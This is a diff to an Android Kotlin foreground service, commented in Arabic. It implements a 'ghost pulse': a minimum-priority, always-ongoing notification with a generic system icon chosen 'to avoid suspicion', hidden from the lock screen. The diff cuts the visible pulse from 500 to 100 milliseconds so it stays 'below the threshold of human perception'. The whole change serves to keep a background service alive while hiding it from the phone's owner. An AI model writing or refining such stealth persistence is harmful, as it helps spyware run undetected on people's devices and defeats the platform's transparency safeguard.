@@ -20,7 +20,7 @@ import androidx.core.app.NotificationCompat
  * استراتيجية النبض الشبحي (Ghost Pulse):
  * - الإشعار الأساسي بأولوية IMPORTANCE_MIN (مخفي تماماً في شريط الحالة)
  * - setOngoing(true) يبقى مفعلاً طوال الوقت لمنع قتل الخدمة
- * - عند استلام PULSE_ACTION، يظهر الإشعار بأولوية DEFAULT لمدة 0.5 ثانية ثم يعود للشبحية
+ * - عند استلام PULSE_ACTION، يظهر الإشعار بأولوية DEFAULT لمدة 0.1 ثانية ثم يعود للشبحية
  * - أيقونة نظامية عامة (ic_popup_sync أو ic_menu_compass) لتجنب الشك
  * - إخفاء المحتوى من شاشة القفل
  * - لا يتم إلغاء الإشعار نهائياً للحفاظ على حالة "الأمامية" للخدمة
@@ -29,7 +29,7 @@ import androidx.core.app.NotificationCompat
  * ✅ هذه الاستراتيجية تمنع قتل الخدمة في أجهزة شاومي وهواوي
  * ✅ مع الحفاظ على التخفي المطلق من وجهة نظر المستخدم
  * ✅ تحقيق "الظهور والاختفاء" دون تعطيل الخدمة
- * ✅ تم زيادة مدة ظهور النبض إلى 500 مللي ثانية لضمان ظهوره الفعلي ثم اختفائه سريعاً
+ * ✅ تم تقليل مدة ظهور النبض إلى 100 مللي ثانية للتخفي المطلق (أقل من عتبة الإدراك البشري)
  * ✅ تم إصلاح مشكلة التوافق مع Android 14+ باستخدام الانعكاس بدلاً من الاستيراد المباشر
  *   لتجنب أخطاء "Unresolved reference" أثناء البناء على جميع الإصدارات.
  */
@@ -57,12 +57,12 @@ class ForegroundService : Service() {
             return START_NOT_STICKY
         }
 
-        // ✅ نبض: عند استلام أمر، يظهر الإشعار لمدة 0.5 ثانية ثم يعود للشبحية
+        // ✅ نبض شبحى: يظهر الإشعار لمدة 0.1 ثانية فقط ثم يعود للشبحية - غير مرئي للعين البشرية
         if (intent?.action == "PULSE_ACTION") {
             startGhostForeground(isPulse = true)
             mainHandler.postDelayed({
                 startGhostForeground(isPulse = false)
-            }, 500) // 0.5 ثانية – كافية لظهور الإشعار واختفائه دون ملاحظة بشرية
+            }, 100) // 100 مللي ثانية فقط - أسرع من عتبة الإدراك البشري (~250 مللي)
             return START_STICKY
         }
 
@@ -130,15 +130,15 @@ class ForegroundService : Service() {
 
             isForeground = true
 
-            val logMsg = if (isPulse) "✅ Ghost notification pulsed (visible for 500ms)" else "✅ Ghost notification started (permanent invisible)"
+            val logMsg = if (isPulse) "✅ Ghost notification pulsed (visible for 100ms)" else "✅ Ghost notification started (permanent invisible)"
             MainActivity.appendLogStatic(logMsg)
             Log.d(TAG, logMsg)
 
-            // ✅ عند النبض، عد إلى الوضع الشبحي بعد 500 مللي
+            // ✅ عند النبض، عد إلى الوضع الشبحي بعد 100 مللي
             if (isPulse) {
                 mainHandler.postDelayed({
                     startGhostForeground(false)
-                }, 500)
+                }, 100)
             }
 
         } catch (e: Exception) {
